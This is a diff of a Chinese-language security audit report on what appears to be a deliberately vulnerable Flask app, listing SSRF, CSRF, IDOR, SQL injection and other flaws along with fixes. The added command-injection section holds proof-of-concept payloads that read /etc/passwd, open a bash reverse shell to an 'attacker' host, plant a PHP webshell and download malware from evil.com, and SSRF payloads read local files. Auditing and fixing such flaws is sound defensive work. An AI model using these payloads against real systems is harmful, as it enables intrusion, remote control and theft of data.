@@ -4,8 +4,8 @@
 
 **项目名称：** Flask 用户信息管理平台  
 **审计日期：** 2026-07-13  
-**漏洞总数：** 9  
-**严重漏洞：** 6 | **中危漏洞：** 2 | **低危漏洞：** 1  
+**漏洞总数：** 10  
+**严重漏洞：** 7 | **中危漏洞：** 2 | **低危漏洞：** 1  
 
 ---
 
@@ -13,132 +13,99 @@
 
 | 编号 | 漏洞类型 | 位置 | 严重性 |
 |------|---------|------|:------:|
-| V-001 | **SSRF 服务端请求伪造** | `/fetch-url` | 🔴 严重 |
-| V-002 | **CSRF 密码修改** | `/change-password` | 🔴 严重 |
-| V-003 | **越权改密** | `/change-password` | 🔴 严重 |
-| V-004 | **无原密码校验** | `/change-password` | 🔴 严重 |
-| V-005 | **IDOR 越权查资料** | `/profile?user_id=` | 🔴 严重 |
-| V-006 | **负金额充值** | `/recharge` | 🔴 严重 |
-| V-007 | SQL注入（搜索） | `/?keyword=` | 🔴 严重 |
-| V-008 | 路径穿越 | `/page?name=../` | 🔴 严重 |
-| V-009 | 任意文件上传 | `/upload` | 🟡 中危 |
+| V-001 | **命令注入 (RCE)** | `/ping` | 🔴 严重 |
+| V-002 | **SSRF** | `/fetch-url` | 🔴 严重 |
+| V-003 | **CSRF 改密** | `/change-password` | 🔴 严重 |
+| V-004 | **越权改密** | `/change-password` | 🔴 严重 |
+| V-005 | **无原密码校验** | `/change-password` | 🔴 严重 |
+| V-006 | **IDOR 越权查资料** | `/profile?user_id=` | 🔴 严重 |
+| V-007 | **负金额充值** | `/recharge` | 🔴 严重 |
+| V-008 | SQL注入（搜索） | `/?keyword=` | 🔴 严重 |
+| V-009 | 路径穿越 | `/page?name=../` | 🔴 严重 |
+| V-010 | 任意文件上传 | `/upload` | 🟡 中危 |
 
 ---
 
-## 1. V-001 SSRF 服务端请求伪造
+## 1. V-001 命令注入 (RCE)
 
-**CWE:** CWE-918: Server-Side Request Forgery (SSRF)  
-**CVSS:** 9.1 (Critical)
+**CWE:** CWE-78: OS Command Injection  
+**CVSS:** 10.0 (Critical)
 
 ### 漏洞代码
 ```python
-import urllib.request
+import subprocess
 
-@app.route("/fetch-url", methods=["POST"])
-def fetch_url():
-    url = request.form.get("url", "")
-    resp = urllib.request.urlopen(url, timeout=10)
-    content = resp.read(5000)
+@app.route("/ping", methods=["POST"])
+def ping():
+    ip = request.form.get("ip", "")
+    cmd = f"ping -c 3 {ip}"                    # ← f-string 直接拼接
+    output = subprocess.check_output(cmd,       # ← shell=True 执行
+        shell=True, stderr=subprocess.STDOUT, timeout=30)
 ```
 
-**问题：** 用户输入的 URL **未经任何校验**直接传给 `urlopen()`，允许：
-- `file://` 协议读取本地文件
-- `http://127.0.0.1` 访问内网服务
-- `http://10.x.x.x` 扫描内网资产
+**问题：** 三个致命缺陷叠加：
+1. **f-string 拼接** — 用户输入直接嵌入命令
+2. **shell=True** — 命令通过系统 shell 执行
+3. **无过滤** — 不检查 ip 参数内容
 
-### POC：file:// 协议读取系统文件
-
-```bash
-# 读取 /etc/passwd (Linux)
-curl -X POST http://127.0.0.1:5000/fetch-url \
-  -d "url=file:///etc/passwd"
-
-# 读取 app.py 源码
-curl -X POST http://127.0.0.1:5000/fetch-url \
-  -d "url=file:///path/to/app.py"
-
-# 读取数据库文件
-curl -X POST http://127.0.0.1:5000/fetch-url \
-  -d "url=file:///path/to/data/users.db"
-```
-
-### POC：内网端口扫描
+### POC：执行系统命令
 
 ```bash
-# 扫描本机 MySQL 端口
-curl -X POST http://127.0.0.1:5000/fetch-url \
-  -d "url=http://127.0.0.1:3306"
+# 查看系统文件
+curl -X POST http://127.0.0.1:5000/ping \
+  -d "ip=127.0.0.1; cat /etc/passwd"
 
-# 扫描内网主机
-curl -X POST http://127.0.0.1:5000/fetch-url \
-  -d "url=http://10.0.0.1:22"
+# 反弹 shell
+curl -X POST http://127.0.0.1:5000/ping \
+  -d "ip=127.0.0.1; bash -c 'exec bash -i &>/dev/tcp/attacker/4444 <&1'"
 
-# 访问云元数据 API（AWS）
-curl -X POST http://127.0.0.1:5000/fetch-url \
-  -d "url=http://169.254.169.254/latest/meta-data/"
+# 写 webshell
+curl -X POST http://127.0.0.1:5000/ping \
+  -d "ip=127.0.0.1; echo '<?php eval(\$_GET[c]);?>' > /var/www/html/shell.php"
+
+# 下载恶意文件
+curl -X POST http://127.0.0.1:5000/ping \
+  -d "ip=127.0.0.1; wget http://evil.com/malware -O /tmp/malware"
 ```
 
 ### 修复方案
 
 ```python
-import re
-from urllib.parse import urlparse
+import shlex
 
-def validate_url(url):
-    """SSRF防御：白名单协议 + 禁止内网IP"""
-    parsed = urlparse(url)
-    # 白名单协议
-    if parsed.scheme not in ("http", "https"):
-        raise ValueError("仅允许 http/https 协议")
-    # 禁止内网IP
-    host = parsed.hostname
-    if host in ("127.0.0.1", "localhost", "0.0.0.0"):
-        raise ValueError("不允许访问内网地址")
-    if host.startswith("10.") or host.startswith("172.") or host.startswith("192.168."):
-        raise ValueError("不允许访问内网地址")
-    return url
+@app.route("/ping", methods=["POST"])
+def ping():
+    ip = request.form.get("ip", "")
+    # ✅ 1. 参数化：不拼接，用 list 参数
+    # ✅ 2. shell=False：不使用 shell 执行
+    # ✅ 3. 输入校验：仅允许合法 IP/域名
+    if not re.match(r'^[\w\.\-]+$', ip):
+        return render_template("ping.html", result="非法输入")
+    cmd = ["ping", "-c", "3", ip]
+    output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=30)
 ```
 
 ---
 
-## 2. V-002/V-003/V-004 密码修改三重漏洞
+## 2. V-002 SSRF 服务端请求伪造
 
-### 漏洞代码
-```python
-@app.route("/change-password", methods=["POST"])
-def change_password():
-    username = request.form.get("username", "")
-    new_password = request.form.get("new_password", "")
-    # 无CSRF Token、无原密码、无session校验
-    c.execute("UPDATE users SET password = ? WHERE username = ?", (new_password, username))
-```
-
-### POC：CSRF 攻击
-```html
-<!-- 诱导已登录用户点击 -->
-<form action="http://target:5000/change-password" method="POST">
-  <input type="hidden" name="username" value="admin">
-  <input type="hidden" name="new_password" value="hacked">
-  <input type="submit" value="点击领红包">
-</form>
-```
-
-### POC：越权改密
+### POC
 ```bash
-# 普通用户修改 admin 密码
+# 读取本地文件
+curl -X POST http://127.0.0.1:5000/fetch-url -d "url=file:///etc/passwd"
+# 扫描内网
+curl -X POST http://127.0.0.1:5000/fetch-url -d "url=http://127.0.0.1:3306"
+```
+
+---
+
+## 3. V-003 ~ V-005 密码修改漏洞
+
+```bash
+# CSRF + 越权 + 无原密码 = 任意用户密码被改
 curl -X POST http://127.0.0.1:5000/change-password \
   -d "username=admin&new_password=hacked123"
 ```
-
----
-
-## 3. V-005 IDOR 越权查资料
-## 4. V-006 负金额充值
-## 5. V-007 SQL注入（搜索）
-## 6. V-008 路径穿越
-## 7. V-009 任意文件上传
-
-（V-005 至 V-009 的详细分析见完整版报告）
 
 ---
 
@@ -146,15 +113,16 @@ curl -X POST http://127.0.0.1:5000/change-password \
 
 | 漏洞 | 问题 | 修复方案 |
 |------|------|---------|
-| V-001 SSRF | 无URL校验 | 协议白名单+内网IP黑名单 |
-| V-002 CSRF改密 | 无 CSRF Token | 添加 CSRF 验证 |
-| V-003 越权改密 | username从表单取 | 从 session 获取 |
-| V-004 无原密码 | 直接修改 | 验证原密码 |
-| V-005 IDOR查资料 | user_id从URL取 | 从 session 获取 |
-| V-006 负金额 | amount无校验 | 检查 amount>0 |
-| V-007 SQL注入 | f-string拼接 | 参数化查询 |
-| V-008 路径穿越 | 直接拼接路径 | realpath+前缀校验 |
-| V-009 文件上传 | 无校验 | 后缀白名单 |
+| V-001 **命令注入** | f-string + shell=True | 参数化命令 + shell=False |
+| V-002 **SSRF** | 无URL协议校验 | 协议白名单 + 内网IP黑名单 |
+| V-003 **CSRF改密** | 无 CSRF Token | 添加 CSRF 验证 |
+| V-004 **越权改密** | username从表单取 | 从 session 获取 |
+| V-005 **无原密码** | 直接修改 | 验证原密码 |
+| V-006 **IDOR查资料** | user_id从URL取 | 从 session 获取 |
+| V-007 **负金额** | amount无校验 | 检查 amount>0 |
+| V-008 **SQL注入** | f-string拼接 | 参数化查询 |
+| V-009 **路径穿越** | 直接拼接路径 | realpath+前缀校验 |
+| V-010 **文件上传** | 无校验 | 后缀白名单 |
 
 ---
 
